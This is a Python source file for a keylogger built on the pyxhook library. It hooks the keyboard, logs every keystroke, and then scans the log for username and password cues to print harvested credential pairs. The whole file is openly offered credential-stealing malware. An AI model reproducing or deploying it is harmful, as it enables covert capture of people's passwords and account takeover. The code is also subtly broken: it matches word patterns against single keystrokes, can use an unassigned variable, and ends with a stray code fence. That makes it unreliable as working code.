import pyxhook
import re

class Keylogger:
    def __init__(self):
        self.key_log = []

    def on_press(self, event):
        if len(event.key) > 1:
            self.key_log.append(event.key)
        else:
            self.key_log.append(event.key)

    def run(self):
        # Create a hook manager object
        hm = pyxhook.HookManager()
        # Set the callbacks
        hm.KeyDown = self.on_press
        # Hook the keyboard
        hm.HookKeyboard()

        try:
            # This is where we wait for events.
            hm.wait()
        except KeyboardInterrupt:
            print("Exiting...")
            # Unhook ourselves so we don't interfere with other programs
            hm.unhook()

    def generate_report(self):
        username_pattern = r'(?i)username|usernam|(?:u(?:ser)?name)'
        password_pattern = r'(?i)password|passw(?:ord)?'

        credentials = {}
        for key in self.key_log:
            if re.search(username_pattern, key):
                user = ''.join(self.key_log[self.key_log.index(key):])
                user = re.search(r'(?<=' + username_pattern + ')[\s\S]+(?=' + password_pattern + ')', user).group()

            elif re.search(password_pattern, key):
                passw = ''
                for i in range(self.key_log.index(key) + 1, len(self.key_log)):
                    if self.key_log[i] == '\r':
                        break
                    passw += self.key_log[i]

                if user and passw:
                    credentials[user.strip()] = passw.strip()

        return credentials


def main():
    keylogger = Keylogger()
    keylogger.run()

    print("\nGenerating report...")
    report = keylogger.generate_report()

    print("\nCredentials Report:")
    for username, password in report.items():
        print(f"{username}: {password}")

if __name__ == "__main__":
    main()
```

